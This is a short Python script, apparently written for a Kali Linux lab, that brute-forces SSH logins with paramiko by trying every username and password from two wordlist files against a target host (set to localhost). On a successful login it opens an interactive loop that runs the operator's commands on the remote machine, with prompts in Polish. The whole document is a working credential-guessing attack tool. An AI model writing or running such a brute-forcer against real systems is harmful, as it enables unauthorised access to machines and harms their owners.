import paramiko

import paramiko
import time
import sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)


target = "127.0.0.1"


usersFile = open("/home/kali/users.txt", "r")
passwordsFile = open("/home/kali/passwords.txt", "r")
users = usersFile.read().split('\n')
passwords = passwordsFile.read().split('\n')
usersFile.close()
passwordsFile.close()


def shell():
    while True:
        command = input("Podaj komende 'exit' aby wyjsc: ")
        if 'exit' in command:
            sys.exit(0)
        stdin, stdout, stderr = ssh.exec_command(command)
        print(stdout.read().decode())


for user in users:
    for password in passwords:
        try:
            time.sleep(1)
            print(f"Trying credentials {user}:{password} ..... ")
            ssh.connect(target, username=user, password=password, timeout=4)
            print("[+] Login successfull with {}:{}".format(user, password))
            print("Preparing shell for you ... ")
            time.sleep(2)
            shell()
        except paramiko.ssh_exception.AuthenticationException as error:
            print("Wrong credentials! {}".format(error))
        except Exception as error:
            print("Something else went wrong: {}".format(error))


